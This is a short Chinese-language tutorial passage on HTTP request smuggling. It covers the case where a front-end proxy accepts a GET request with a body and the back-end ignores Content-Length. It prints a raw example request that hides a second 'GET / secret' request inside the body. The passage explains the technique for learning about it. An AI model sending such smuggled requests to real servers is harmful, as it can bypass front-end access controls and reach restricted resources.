### CL不为0的GET请求

前端代理服务器允许GET请求携带请求体，但后端服务器不允许GET请求携带请求体，则后端服务器会忽略掉GET请求中的`Content-Length`，不进行处理，从而导致请求走私。

```bash
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET / secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n

```

前端服务器收到该请求，通过读取`Content-Length`，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对`Content-Length`进行处理，由于`Pipeline`的存在，它就认为这是收到了两个请求。

